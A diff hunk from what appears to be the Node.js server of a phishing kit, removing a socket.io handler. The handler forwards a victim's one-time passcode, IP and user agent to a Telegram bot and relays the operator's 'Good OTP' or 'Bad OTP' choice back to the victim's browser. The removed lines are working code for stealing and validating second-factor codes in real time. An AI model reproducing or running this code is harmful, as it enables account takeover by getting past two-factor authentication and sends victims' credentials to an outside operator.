@@ -282,32 +282,6 @@ io.on('connection', (socket, req) => {
         //console.log(data)
     })
 
-    socket.on('otp', (data) => {
-      
-        const opts = {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: 'Good OTP', callback_data: `good:${userIP}`}],
-                    [{ text: 'Bad OTP', callback_data: `bad:${userIP}` }]
-                ]
-            }
-        };
-        bot.sendMessage(chatId, `OTP: ${data.otp}\n\nIP: ${userIP} \nUserAgent: ${data.userAgent}`, opts);
-    })
-
-    bot.on('callback_query', function onCallbackQuery(callbackQuery) {
-        const splitData = callbackQuery.data.split(":");
-        const action = splitData[0]
-        const ip = splitData[1]
-        const msg = callbackQuery.message;
-
-        let data = {
-            action : action
-        }
-
-        io.to(ip).emit('choice', data)
-    });
-
   socket.on('disconnect', () => {
         if (sessionStore.has(userIP)) {
             let userDetails = sessionStore.get(userIP);
